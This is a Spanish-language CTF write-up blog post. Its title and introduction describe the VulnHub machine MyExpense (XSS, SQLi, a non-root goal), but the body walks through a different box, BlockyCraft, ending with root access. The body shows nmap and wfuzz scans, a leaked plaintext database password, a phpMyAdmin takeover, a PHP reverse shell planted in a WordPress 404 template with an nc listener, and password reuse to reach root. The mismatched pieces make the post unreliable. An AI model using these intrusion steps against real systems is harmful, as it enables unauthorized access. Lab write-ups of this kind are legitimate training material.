---
layout: single
title: MyExpense - VulnHub Machine
excerpt: "Máquina linux de la plataforma VulnHub, donde se puede practicar XSS y SQLI"
date: 2023-10-25
classes: wide
header:
  teaser: /assets/images/vh-writeup-myexpense/portada-myexpense.png
  teaser_home_page: true
  icon: /assets/images/vulhub.png
categories:
  - VulnHub
tags:
  - sql
  - sqli
  - xss
  - session
  - hijacking
  - linux
---
![](/assets/images/vh-writeup-myexpense/portada-myexpense.png)

MyExpense es una máquina linux de [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/#top) y a diferencia de las máquinas de [HackTheBox](https://www.hackthebox.com/), su finalidad no la de llegar a ser root en el servidor comprometido.

En este caso, somos un "Samuel Lamotte", exempleado de una empresa la cual nos ha despedido y encima, no nos han tramitado un pago que nos deben. Nuestro objetivo será infiltrarnos en el sistema para que el pago se lleve a cabo.

## Índice
* [Fase de reconocimiento](#reconocimiento)
  * [Reconociento de puertos y servicios](#reconocimiento)
  * [Reconocimiento de la página web](#reconocimiento-web)
  * [Fuzzing de la web](#fuzzing)
* [Fase de explotación](#explotacion)
* [Escalada de pivilegios](#escalada)

<a id="reconocimiento"></a>
## Fase de reconocimiento

### Reconocimiento de puertos y servicios


Empezaremos utilizando nmap para descubrir los puertos abiertos accesibles(digo accesibles ya que la máquina puede tener más puertos abiertos pero que solo son accesibles desde la misma).
```bash
nmap -p- -sS --min-rate 5000 --open -Pn -n -vvvv 10.10.10.37 -oN writeup-scan-ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 15:40 CEST
Initiating SYN Stealth Scan at 15:40
Scanning 10.10.10.37 [65535 ports]
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 25565/tcp on 10.10.10.37
Completed SYN Stealth Scan at 15:40, 30.42s elapsed (65535 total ports)
Nmap scan report for 10.10.10.37
Host is up, received user-set (1.1s latency).
Scanned at 2021-09-24 15:40:00 CEST for 30s
Not shown: 65530 filtered ports, 1 closed port
Reason: 65530 no-responses and 1 reset
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   REASON
21/tcp    open  ftp       syn-ack ttl 63
22/tcp    open  ssh       syn-ack ttl 63
80/tcp    open  http      syn-ack ttl 63
25565/tcp open  minecraft syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.51 seconds
           Raw packets sent: 131081 (5.768MB) | Rcvd: 30 (1.312KB)
```

Como podemos observar, hay varios puertos interesantes. En el puerto 21 corre un servicio *ftp*. Esto nos daría la idea de probar si nos pudieramos identificar con el usuario anonymous y sin contraseña pero en este caso no funciona. También hay un servicio *ssh* que puede que nos sirva de ayuda más adelante, un servicio *http* donde se encuentra la página web y por último pero no menos importante, un servidor de minecraft. Este último nos da una pequeña pista de lo que tendremos que hacer después aunque no utilicemos este puerto.

Una vez escaneados los puertos, escanearemos más en profundidad para ver que servicios usan y sus respectivas versiones.

```bash
nmap -sC -sV -p21,22,80,25565 -oN targeted 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.054s latency).

PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 24 13:19:42 2021 -- 1 IP address (1 host up) scanned in 11.28 seconds

```

Lo más importante que hay que destacar del escaneo es que el servidor utiliza un Wordpress de version 4.8. Sin embargo, si buscamos exploits de esta version o utilizamos herramientas como wpscan nos daremos cuenta de que no existe ninguna vía potencial de explotación. Al igual pasa con el servicio ProFTPD 1.3.5a.

<a id="reconocimiento-web"></a>
### Reconocimiento de la página web


Una vez habiendo escaneado al servidor, es hora de analizar la página manualmente. Como tiene un servicio http corriendo en el puerto 80 apuntamos a la dirección de la máquina desde nuestro navegador.

![](/assets/images/htb-writeup-blocky/pg-principal.PNG)

Tras no encontrar ninguna vulnerabilidad en el wordpress y haber trasteado con la página web, la única información de valor que podemos obtener es la del nombre de un usuario: ```notch```. Sin embargo, si intentamos logearnos con credenciales por defecto como 1234 o admin como contraseña o incluso si aplicamos fuerza bruta con el diccionario de *rockyou.txt* no conseguimos nada. A estas alturas lo mejor es ir en busca de directorios ocultos en el sitio web.

<a id="fuzzing"></a>
### Fuzzing de la web

Para fuzzear la página he utilizado la herramienta wfuzz con el diccionario directory-list-2.3-medium de dirbuster:

```bash

wfuzz -c --hw=3592 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.10.37/FUZZ
 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.37/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000190:   301        9 L      28 W       309 Ch      "wiki"                            
000000241:   301        9 L      28 W       315 Ch      "wp-content"                           
000000519:   301        9 L      28 W       312 Ch      "plugins"                                
000000786:   301        9 L      28 W       316 Ch      "wp-includes"                    
000001073:   301        9 L      28 W       315 Ch      "javascript"
000007180:   301        9 L      28 W       313 Ch      "wp-admin"                               
000010825:   301        9 L      28 W       315 Ch      "phpmyadmin"
```

Como podemos observar, hay una ruta llamada plugins. 

<a id="explotacion"></a>

![](/assets/images/htb-writeup-blocky/plugins.PNG)

## Fase de explotación

Descarguémonos los plugins para ver que contienen. Como .jar es una extensión de un archivo comprimido los descomprimimos con ```unzip [nombre del archivo]```. 
Una vez hecho esto nos centraremos en el plugin *BlockyCore.class* que se encuentra dentro de la carpeta ```com->myfirstpuglin```.

Con ```javap -c BlockyCore.class``` diseccionamos el código y encontramos lo siguiente:

```bash
public com.myfirstplugin.BlockyCore();
    Code:
       0: aload_0
       1: invokespecial #12                 // Method java/lang/Object."<init>":()V
       4: aload_0
       5: ldc           #14                 // String localhost
       7: putfield      #16                 // Field sqlHost:Ljava/lang/String;
      10: aload_0
      11: ldc           #18                 // String root
      13: putfield      #20                 // Field sqlUser:Ljava/lang/String;
      16: aload_0
      17: ldc           #22                 // String 8YsqfCTnvxAUeduzjNSXe22
      19: putfield      #24                 // Field sqlPass:Ljava/lang/String;
```

Como podemos observar, hay credenciales para el usuario root de lo que sería problamente el phpmyadmin que encontramos cuando fuzzeamos. Las probamos y entramos como root.

![](/assets/images/htb-writeup-blocky/phpmyadmin-login.PNG)

Una vez dentro, como hemos entrado con permisos de administrador, podemos modificar la contraseña de wordpress del usuario notch.

![](/assets/images/htb-writeup-blocky/phpmyadmin-change1.PNG)

![](/assets/images/htb-writeup-blocky/phpmyadmin-change2.PNG)

Ahora entramos en wordpress como usuario administrador y hacemos una reverse shell. Para ello nos dirigimos a ```Appearance->Editor``` y modificamos la plantilla 404.php.

![](/assets/images/htb-writeup-blocky/wp-login_reverse_shell.PNG)

En ella pegamos este <a href="https://github.com/jivoi/pentest/blob/master/shell/rshell.php" target="_blank">script de reverse shell</a>.

Editamos la ip y el puerto en el script, además de ponernos en escucha desde nuestro ordenador de atacante:

```bash
nc -nlvp 443 
```
En mi caso me he puesto en escucha por el puerto 443. Ahora, abrimos la página web por la ruta [IP]/?p=404.php para que nos apunte a nuestro código php malicioso. Esto nos mandará una shell a nuestro netcat dandónos acceso al servidor como el usuario www-data.


<a id="escalada"></a>

## Escalada de privilegios

A estas alturas del ataque deberíamos de hacer un reconocimiento del sistema buscando potenciales vectores de ataque como las capabilities o los archivos SUID. No obstante, la solución es mucho más sencilla que eso. Si utilizamos la contraseña de phpmyadmin para convertirte en notch (```su notch```), nos damos cuenta de que es la misma. Como notch es un sudoer podemos hacer ```sudo su``` y con la contraseña de notch nos convertimos en root.


Evidentemente hay muchas maneras distintas de comprometer un servidor, en este caso por ejemplo podríamos haber intentado un *ssh* con el usuario notch y la contraseña de phpmyadmin e igualmente hubieramos entrado al sistema. De todas formas esta es la forma que encuentro más coherente de operar.
